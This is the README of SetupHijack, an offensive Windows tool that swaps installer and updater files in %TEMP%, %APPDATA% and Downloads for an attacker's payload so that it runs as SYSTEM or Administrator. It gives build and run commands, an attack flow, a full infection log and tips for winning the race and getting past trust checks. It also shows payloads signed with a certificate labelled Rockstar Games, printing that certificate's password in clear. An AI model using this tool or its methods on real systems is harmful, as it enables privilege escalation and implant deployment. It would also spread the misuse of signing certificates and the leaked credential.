# SetupHijack

---

## Overview

**SetupHijack** is a security research tool that exploits race conditions and insecure file handling in Windows installer and update processes. It targets scenarios where privileged installers or updaters drop files in `%TEMP%` or other world-writable locations, allowing an attacker to replace these files before they are executed with elevated privileges.

- Does **not** require elevated permissions to run.
- Does **not** use file system notifications (polls for changes instead).
- Exploits weaknesses in Authenticode code signing and installer trust models.
- Can infect `.exe`, `.msi`, and batch files (e.g., `sysinfo`, `netstat`, `ipconfig`).
- Designed for red team, penetration testing, and security research use only.

The intended use of this tool is to run in the background on a compromised user account with privileges, in order to elevate another process by hijacking installer/updater file drops.

## How It Works

1. **SetupHijack** continuously scans `%TEMP%` (and subdirectories) for new or modified installer files.
2. When a target file is detected, it is replaced with a user-supplied payload (EXE, MSI, or BAT), optionally preserving the original as a `.bak` file.
3. If the privileged process executes the replaced file before integrity checks, the payload runs with elevated rights (e.g., SYSTEM or Administrator).
4. The tool logs all actions and maintains a skiplist to avoid re-infecting the same files.

## Code Signing Note

This project uses a hacked code-signing process with [SignToolEx.exe and SignToolExHook.dll](https://github.com/hackerhouse-opensource/SignToolEx) to sign payloads and installers. Using valid code-signing certificates and an Authenticode timestamp will increase your success rate when bypassing installer and OS trust checks.

---

## Usage

### Build

```sh
nmake PAYLOAD=c:\Path\to\your\payload.exe
```

### Run (Options)

```sh
SetupHijack.exe                  # Scan %%TEMP%%, %%APPDATA%%, and %%USERPROFILE%%\Downloads (default)
SetupHijack.exe -notemp          # Disable scanning %%TEMP%%
SetupHijack.exe -noappdata       # Disable scanning %%APPDATA%%
SetupHijack.exe -nodownloads     # Disable scanning %%USERPROFILE%%\Downloads
SetupHijack.exe clean            # Clean mode (restores .bak backups in all enabled locations)
SetupHijack.exe verbose          # Verbose mode (log all actions)
SetupHijack.exe <payload.exe>    # Use specified payload for .exe (unless argument is a recognized option)
```

- Run **SetupHijack.exe** before or during a privileged install/update process.
- By default, the tool scans all common drop locations: %%TEMP%%, %%APPDATA%%, and %%USERPROFILE%%\Downloads.
- You can disable any location with the `-notemp`, `-noappdata`, or `-nodownloads` flags.
- The `clean` flag restores backups in all enabled locations. The `verbose` flag logs all actions.
- For remote escalation, use with `shadow.exe` or similar tools on Terminal Services.

## Example Attack Flow

1. Build your payload and SetupHijack:
   ```sh
   nmake PAYLOAD=c:\Users\YourUser\Desktop\payload.exe
   ```
2. Start SetupHijack:
   ```sh
   SetupHijack.exe
   ```
3. Launch the target installer or update process as Administrator.
4. If the installer drops files in `%TEMP%` and executes them with elevated rights, your payload will be substituted and run.

## Example Output

Below is a real example of building and running SetupHijack, including code signing and infection output:

```
C:\Users\Fantastic\Desktop\Sayuri\InfectElevatedSetups>nmake PAYLOAD="C:\USers\Fantastic\Desktop\DEMO\Renge_x64.exe"

Microsoft (R) Program Maintenance Utility Version 14.29.30159.0
Copyright (C) Microsoft Corporation.  All rights reserved.

        powershell -Command "(Get-Content SetupHijack.cpp) -replace '#define PAYLOAD_PATH L\".*\"', '#define PAYLOAD_PATH L\"%ESCAPED_PAYLOAD%\"' | Set-Content SetupHijack.cpp"
        cl /nologo /W4 /EHsc /DUNICODE /D_UNICODE /MT /O2 /c SetupHijack.cpp
SetupHijack.cpp
SetupHijack.cpp(318): warning C4189: 'hr2': local variable is initialized but not referenced
        taskkill /f /im SetupHijack.exe 2>nul
        powershell -Command "Start-Sleep -Milliseconds 500"
        link /nologo /SUBSYSTEM:CONSOLE /ENTRY:wmainCRTStartup /NODEFAULTLIB:MSVCRT /NODEFAULTLIB:MSVCPRT /OUT:SetupHijack.exe SetupHijack.obj kernel32.lib user32.lib shlwapi.lib Shell32.lib /MANIFEST /MANIFESTFILE:SetupHijack.exe.manifest
        copy /y install.wxs.template install.wxs
        1 file(s) copied.
        powershell -Command "(Get-Content install.wxs) -replace 'Source=\"PAYLOAD_PLACEHOLDER\"', 'Source=\"%ESCAPED_PAYLOAD%\"' | Set-Content install.wxs"
        wix build install.wxs -o install.msi
Generating install.bat with payload C:\USers\Fantastic\Desktop\DEMO\Renge_x64.exe
Generating launch_payload.bat with payload C:\USers\Fantastic\Desktop\DEMO\Renge_x64.exe
        powershell -Command "(Get-Content install.wxs) -replace '(<File Id=\"RengeExeFile\" Source=\").*?(\" KeyPath=\"yes\"/>)', '`%ESCAPED_PAYLOAD%`' | Set-Content install.wxs"
        call sign_random.bat
Using CERT: [certs\rockstar1.pfx]
Using PASS: [C!EZxYUxVGPzQDj3]
The following certificate was selected:
    Issued to: Rockstar Games, Inc.
    Issued by: Entrust Code Signing CA - OVCS1
    Expires:   Thu Mar 20 17:16:13 3000
    SHA1 hash: C9793F4A2E629D88F2213622D7A0C170D9C7CBC6

Done Adding Additional Store
Successfully signed: SetupHijack.exe

Number of files successfully Signed: 1
Number of warnings: 0
Number of errors: 0
The following certificate was selected:
    Issued to: Rockstar Games, Inc.
    Issued by: Entrust Code Signing CA - OVCS1
    Expires:   Thu Mar 20 17:16:13 3000
    SHA1 hash: C9793F4A2E629D88F2213622D7A0C170D9C7CBC6

Done Adding Additional Store
Successfully signed: install.msi

Number of files successfully Signed: 1
Number of warnings: 0
Number of errors: 0

C:\Users\Fantastic\Desktop\Sayuri\InfectElevatedSetups>SetupHijack.exe
[2025-09-24 15:20:46] [SetupHijack] Using payload: C:\USers\Fantastic\Desktop\DEMO\Renge_x64.exe
[2025-09-24 15:20:46] [SetupHijack] If infecting .msi, will use: install.msi
[2025-09-24 15:20:46] [SetupHijack] Polling enabled locations recursively for .exe, .msi, .bat:
[2025-09-24 15:20:46]   - C:\Users\FANTAS~1\AppData\Local\Temp
[2025-09-24 15:20:46]   - C:\Users\Fantastic\AppData\Roaming
[2025-09-24 15:20:46]   - C:\Users\Fantastic\Downloads
[2025-09-24 15:20:46] [SetupHijack] Entering infection loop.
[2025-09-24 15:20:59] [SetupHijack] Total infections this session: 0
[2025-09-24 15:21:13] [SetupHijack] Replaced C:\Users\FANTAS~1\AppData\Local\Temp\installcmd.bat with payload install.bat, backup: C:\Users\FANTAS~1\AppData\Local\Temp\installcmd.bat.bak
[2025-09-24 15:21:13] [SetupHijack] New infections this run: 1
[2025-09-24 15:21:22] [SetupHijack] Replaced C:\Users\Fantastic\Downloads\installcmd.msi with payload install.msi, backup: C:\Users\Fantastic\Downloads\installcmd.msi.bak
[2025-09-24 15:21:26] [SetupHijack] New infections this run: 1
[2025-09-24 15:21:26] [SetupHijack] Total infections this session: 2
[2025-09-24 15:21:41] [SetupHijack] Replaced C:\Users\Fantastic\AppData\Roaming\InsecureApp\setup.exe with payload C:\USers\Fantastic\Desktop\DEMO\Renge_x64.exe, backup: C:\Users\Fantastic\AppData\Roaming\InsecureApp\setup.exe.bak
[2025-09-24 15:21:41] [SetupHijack] New infections this run: 1
[2025-09-24 15:21:53] [SetupHijack] Total infections this session: 3
```

## Example Use to Deploy An Implant

Below is a screenshot showing SetupHijack in action, deploying an implant during a privileged installer run:

![Example Use to Deploy An Implant](docs/example_execution.png)

## Security Notes

- This tool is for authorized testing and research only.
- Exploiting these weaknesses can result in full SYSTEM compromise when user in Administrator group.
- Installers may use hash/signature checks that will block this attack, but many still do not.
- Always use in a controlled environment.
- If you discover a CVE or get bounty with this tool, credit us!

Targeting a single directory (such as `%TEMP%`) at a time can increase the likelihood of winning any time-of-creation/time-of-use (TOCTOU) race condition, as it allows for faster polling and less contention. For maximum reliability, run multiple instances of SetupHijack, each focused on a single directory. For optimum results, ensure your payload (the EXE you want to run elevated) includes a manifest requesting elevation (requireAdministrator), and is signed with a valid code-signing certificate that includes an Authenticode timestamp. This increases the chance of bypassing installer and OS trust checks on installers.

---

These files are available under an Attribution-NonCommercial-NoDerivatives 4.0 International license.
